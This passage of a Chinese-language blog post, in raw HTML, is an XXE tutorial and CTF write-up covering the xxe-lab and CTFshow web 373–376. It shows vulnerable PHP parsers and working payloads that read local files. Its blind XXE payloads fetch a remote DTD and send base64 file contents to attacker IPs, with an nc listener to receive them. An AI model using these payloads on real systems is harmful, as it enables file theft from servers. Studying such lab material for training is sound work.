punctuation\">,</span><span class=\"token number\">98</span><span class=\"token punctuation\">(</span>_lpadmin<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">401</span><span class=\"token punctuation\">(</span>com<span class=\"token operator\">.</span>apple<span class=\"token operator\">.</span>sharepoint<span class=\"token operator\">.</span>group<span class=\"token operator\">.</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">33</span><span class=\"token punctuation\">(</span>_appstore<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">(</span>_lpoperator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">204</span><span class=\"token punctuation\">(</span>_developer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">398</span><span class=\"token punctuation\">(</span>com<span class=\"token operator\">.</span>apple<span class=\"token operator\">.</span>access_screensharing<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">399</span><span class=\"token punctuation\">(</span>com<span class=\"token operator\">.</span>apple<span class=\"token operator\">.</span>access_ssh<span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span>file<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"靶场实战\"><a href=\"#靶场实战\" class=\"headerlink\" title=\"靶场实战\"></a>靶场实战</h1><h2 id=\"XXE-lab\"><a href=\"#XXE-lab\" class=\"headerlink\" title=\"XXE-lab\"></a>XXE-lab</h2><p>github地址<br><a href=\"https://github.com/c0ny1/xxe-lab\">https://github.com/c0ny1/xxe-lab</a></p>\n<h3 id=\"有回显-1\"><a href=\"#有回显-1\" class=\"headerlink\" title=\"有回显\"></a>有回显</h3><p>靶场自带的就是有回显的，源代码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$USERNAME</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//账号</span>\n<span class=\"token variable\">$PASSWORD</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//密码</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token constant\">null</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$creds</span> <span class=\"token operator\">=</span> <span class=\"token function\">simplexml_import_dom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dom</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$creds</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span>\n  <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$creds</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$USERNAME</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$PASSWORD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> <span class=\"token variable\">$e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$e</span><span class=\"token operator\">-></span><span class=\"token function\">getMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Content-Type: text/html; charset=utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//echo $result;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>方法同之前即可，此时我们就找有回显的点，然后将我们想读取的文件作为实体参数的内容，调用实体参数，此时输出结果就可以得到文件内容<br>构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span> encoding<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"utf-8\"</span><span class=\"token delimiter important\">?></span></span>  \n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">xml</span> <span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> \n&lt;!ENTITY quan9i SYSTEM \"file:///c:/windows/system.ini\">  \n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>user</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>username</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&quan9i;\">&amp;quan9i;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>username</span><span class=\"token punctuation\">></span></span> \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>password</span><span class=\"token punctuation\">></span></span>1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>password</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>user</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153672.png\" alt=\"在这里插入图片描述\"><br>换个文件再试试<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153974.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"无回显-1\"><a href=\"#无回显-1\" class=\"headerlink\" title=\"无回显\"></a>无回显</h3><p>把靶场的输出信息给注释了就是无回显了<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153010.png\" alt=\"在这里插入图片描述\"><br>随便输入一下然后抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153032.png\" alt=\"在这里插入图片描述\"></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153063.png\" alt=\"在这里插入图片描述\"><br>测试一下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153096.png\" alt=\"在这里插入图片描述\"><br>此时是无回显的，这就对应了Blind XXE的情况，此时可以利用外带和伪协议来获取文件内容，具体方式如下<br>构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?</span>xml version<span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"1.0\"</span><span class=\"token delimiter important\">?></span></span>\n<span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">test</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\">\n&lt;!ENTITY %file SYSTEM \"php://filter/convert.base64-encode/resource=D:/phpStudy/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\"\n//参数实体声明中使用到了php的base64编码，这样是为了尽量避免由于文件内容的特殊性，产生xml解析器错误。\n&lt;!ENTITY %dtd SYSTEM \"http://192.168.134.128/eval.xml\">\n%dtd;\n%send;\n</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>攻击机<code>192.168.134.128</code>中<code>eval.xml</code>的内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> payload <span class=\"token string double-quoted-string\">\"&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.134.128/?content=%file;'>\"</span><span class=\"token operator\">></span>\n<span class=\"token comment\">//%要进行实体编码&amp;#x25</span>\n <span class=\"token operator\">%</span>payload<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>攻击方式简述<br>1、%dtd :包含eval.xml–&gt;调用payload实体参数–&gt;调用file实体参数–&gt;查看指定文件<br>此时send实体参数中的内容就是文件内容<br>2、%send，调用send实体参数 ，此时文件内容就会被外带出来</p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153456.png\" alt=\"在这里插入图片描述\"><br>将内容进行base64解码<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153554.png\" alt=\"在这里插入图片描述\"><br>得到文件内容</p>\n<h2 id=\"CTFshow\"><a href=\"#CTFshow\" class=\"headerlink\" title=\"CTFshow\"></a>CTFshow</h2><h3 id=\"web-373\"><a href=\"#web-373\" class=\"headerlink\" title=\"web 373\"></a>web 373</h3><p>源码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$creds</span> <span class=\"token operator\">=</span> <span class=\"token function\">simplexml_import_dom</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$dom</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$ctfshow</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$creds</span><span class=\"token operator\">-></span><span class=\"token property\">ctfshow</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$ctfshow</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>   <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>不难发现这里的话输出的是这个<code>$ctfshow</code>，因此这里的话我们把引用一个元素放入这个里面就可以了，构造payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> test <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> xxe <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"file:///flag\"</span><span class=\"token operator\">></span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>quan9i<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>ctfshow<span class=\"token operator\">></span><span class=\"token operator\">&amp;</span>xxe<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ctfshow<span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>quan9i<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153491.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"web-374\"><a href=\"#web-374\" class=\"headerlink\" title=\"web 374\"></a>web 374</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话发现没回显了，需要用之前服务器外带的那种方法来获取文件内容，具体攻击方式如下<br>payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> test <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=/flag\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> aaa <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"http://124.222.255.142:8083/xxe.dtd\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">%</span>aaa<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>xxe<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>xxe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>服务器文件内容</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> dtd <span class=\"token string double-quoted-string\">\"&lt;!ENTITY &amp;#x25; xxe  SYSTEM 'http://124.222.255.142:7777/?content=%file;'> \"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">%</span>dtd<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span>xxe<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153588.png\" alt=\"在这里插入图片描述\"><br>文件内容base64解码即可得到flag<br>原理也很简单，与之前类似</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、调用aaa参数实体<span class=\"token operator\">--</span><span class=\"token operator\">></span>包含dtd文件<span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token property\">xml</span><span class=\"token operator\">.</span>dtd文件中包含了file参数实体<span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token property\">file</span>参数实体被调用，成功读取文件<span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token property\">xml</span><span class=\"token operator\">.</span>dtd文件调用dtd参数实体，此时就包含了后面那些内容<span class=\"token operator\">--</span><span class=\"token operator\">></span><span class=\"token property\">xml</span><span class=\"token operator\">.</span>dtd文件调用xxe参数实体，xxe参数实体中含有file参数实体，也就是文件内容，此时就会将内容给带出来\n<span class=\"token number\">2</span>、监听<span class=\"token number\">7777</span>端口，获取这个内容，就相当于我们访问了文件，此时就可以达到我们外带的目的了<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<h3 id=\"web-375\"><a href=\"#web-375\" class=\"headerlink\" title=\"web 375\"></a>web 375</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?xml version=\"1\\.0\"/'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>增添了过滤，过滤了内容<code>&lt;?xml version=&quot;1.0&quot;</code>，我们这里同上关payload即可，不过我们这里的话我们在payload中进行调用，不在在文件中进行调用，payload如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">DOCTYPE</span> test <span class=\"token punctuation\">[</span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> file <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"php://filter/read=convert.base64-encode/resource=/flag\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> xxe <span class=\"token constant\">SYSTEM</span> <span class=\"token string double-quoted-string\">\"http://124.222.255.142:8083/xxe.dtd\"</span><span class=\"token operator\">></span>\n<span class=\"token operator\">%</span>xxe<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span>dtd<span class=\"token punctuation\">;</span>\n<span class=\"token operator\">%</span>send<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>\n<span class=\"token operator\">&lt;</span>xxe<span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>xxe<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>文件内容为</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token constant\">ENTITY</span> <span class=\"token operator\">%</span> dtd <span class=\"token string double-quoted-string\">\"&lt;!ENTITY &amp;#x25; send  SYSTEM 'http://124.222.255.142:7777/?content=%file;'> \"</span><span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>先监听，后发包</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">nc <span class=\"token operator\">-</span>lvnp <span class=\"token number\">7777</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153577.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130153112.png\" alt=\"在这里插入图片描述\"><br>base64解码可得flag</p>\n<h3 id=\"web-376\"><a href=\"#web-376\" class=\"headerlink\" title=\"web 376\"></a>web 376</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">libxml_disable_entity_loader</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$xmlfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/&lt;\\?xml version=\"1\\.0\"/i'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'error'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$dom</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">DOMDocument</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$dom</span><span class=\"token operator\">-></span><span class=\"token function\">loadXML</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$xmlfile</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">LIBXML_NOENT</span> <span class=\"token operator\">|</span> <span class=\"token class-name\">LIBXML_DTDLOAD</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token 